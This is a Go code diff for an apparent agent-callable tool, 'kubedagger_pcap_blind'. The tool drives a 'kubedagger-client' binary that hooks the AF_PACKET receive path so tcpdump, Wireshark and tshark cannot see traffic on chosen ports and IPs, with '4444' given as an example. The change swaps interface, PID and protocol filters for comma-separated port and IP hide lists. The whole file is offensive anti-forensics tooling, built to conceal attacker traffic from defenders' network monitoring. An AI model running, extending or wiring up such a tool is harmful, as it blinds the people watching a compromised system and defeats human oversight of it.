@@ -11,10 +11,8 @@ import (
 )
 
 type PcapBlindInput struct {
-	Interface string `json:"interface,omitempty"`
-	PID       int    `json:"pid,omitempty"`
-	Port      int    `json:"port,omitempty"`
-	Protocol  string `json:"protocol,omitempty"`
+	HidePorts string `json:"hide_ports,omitempty"`
+	HideIPs   string `json:"hide_ips,omitempty"`
 }
 
 type PcapBlindTool struct {
@@ -28,29 +26,20 @@ func NewPcapBlind(exec executor.Executor) *PcapBlindTool {
 func (t *PcapBlindTool) Name() string { return "kubedagger_pcap_blind" }
 
 func (t *PcapBlindTool) Description() string {
-	return "Blind packet capture tools (tcpdump, Wireshark, tshark) by hooking the AF_PACKET socket receive path. Prevents specific traffic from being visible to network monitoring while allowing it to flow normally."
+	return "Blind packet capture tools (tcpdump, Wireshark, tshark) by hooking the AF_PACKET socket receive path. Hides traffic on specified ports and IPs from network monitoring while allowing it to flow normally."
 }
 
 func (t *PcapBlindTool) InputSchema() json.RawMessage {
 	return json.RawMessage(`{
 		"type": "object",
 		"properties": {
-			"interface": {
+			"hide_ports": {
 				"type": "string",
-				"description": "Network interface to blind captures on"
+				"description": "Comma-separated list of ports whose traffic is hidden (e.g. '4444,8080')"
 			},
-			"pid": {
-				"type": "integer",
-				"description": "Hide traffic from/to this process"
-			},
-			"port": {
-				"type": "integer",
-				"description": "Hide traffic on this port"
-			},
-			"protocol": {
+			"hide_ips": {
 				"type": "string",
-				"enum": ["tcp", "udp", "icmp", "all"],
-				"description": "Protocol to hide"
+				"description": "Comma-separated list of IP addresses whose traffic is hidden"
 			}
 		}
 	}`)
@@ -62,22 +51,19 @@ func (t *PcapBlindTool) Execute(ctx context.Context, params json.RawMessage) (*m
 		return errorResult("invalid input: " + err.Error()), nil
 	}
 
-	if err := validateSafeString(input.Interface, "interface"); err != nil {
+	if err := validateSafeString(input.HidePorts, "hide_ports"); err != nil {
+		return errorResult(err.Error()), nil
+	}
+	if err := validateSafeString(input.HideIPs, "hide_ips"); err != nil {
 		return errorResult(err.Error()), nil
 	}
 
 	args := []string{"pcap-blind"}
-	if input.Interface != "" {
-		args = append(args, "--interface", input.Interface)
+	if input.HidePorts != "" {
+		args = append(args, "--hide-ports", input.HidePorts)
 	}
-	if input.PID > 0 {
-		args = append(args, "--pid", fmt.Sprintf("%d", input.PID))
-	}
-	if input.Port > 0 {
-		args = append(args, "--port", fmt.Sprintf("%d", input.Port))
-	}
-	if input.Protocol != "" {
-		args = append(args, "--protocol", input.Protocol)
+	if input.HideIPs != "" {
+		args = append(args, "--hide-ips", input.HideIPs)
 	}
 
 	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
